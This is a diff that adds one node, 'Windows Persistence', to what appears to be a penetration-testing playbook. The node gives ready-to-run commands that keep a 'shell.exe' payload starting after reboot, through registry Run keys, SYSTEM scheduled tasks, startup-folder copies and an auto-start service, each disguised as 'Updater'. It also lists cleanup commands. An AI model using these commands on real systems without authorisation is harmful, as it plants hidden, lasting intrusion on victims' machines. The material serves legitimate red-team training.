@@ -1,0 +1,18 @@
+{
+  "id": "persistence",
+  "phase": "WINDOWS",
+  "title": "Windows Persistence",
+  "body": "Maintain access after reboot. Registry run keys, scheduled tasks, service installation, startup folder. Always document and clean up after the engagement.",
+  "cmd": "# ── REGISTRY RUN KEYS ────────────────────────────────\n# HKCU — current user (no admin needed)\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\shell.exe\" /f\n\n# HKLM — all users (needs admin)\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\shell.exe\" /f\n\n# PowerShell\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Updater\" -Value \"C:\\Windows\\Temp\\shell.exe\"\n\n# ── SCHEDULED TASK ────────────────────────────────────\nschtasks /create /tn \"Updater\" /tr \"C:\\Windows\\Temp\\shell.exe\" /sc onlogon /ru SYSTEM\nschtasks /create /tn \"Updater\" /tr \"C:\\Windows\\Temp\\shell.exe\" /sc minute /mo 5\n\n# ── STARTUP FOLDER ───────────────────────────────────\n# Current user\ncopy shell.exe \"C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n# All users (needs admin)\ncopy shell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n\n# ── SERVICE PERSISTENCE ──────────────────────────────\nsc create Updater binpath= \"C:\\Windows\\Temp\\shell.exe\" start= auto\nsc start Updater\n\n# ── CLEANUP ──────────────────────────────────────────\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /f\nschtasks /delete /tn \"Updater\" /f\nsc stop Updater && sc delete Updater",
+  "warn": "Always document persistence mechanisms and clean up after the engagement.",
+  "choices": [
+    {
+      "label": "Back to post-exploit enum",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Pivot to next machine",
+      "next": "pivot_start"
+    }
+  ]
+}
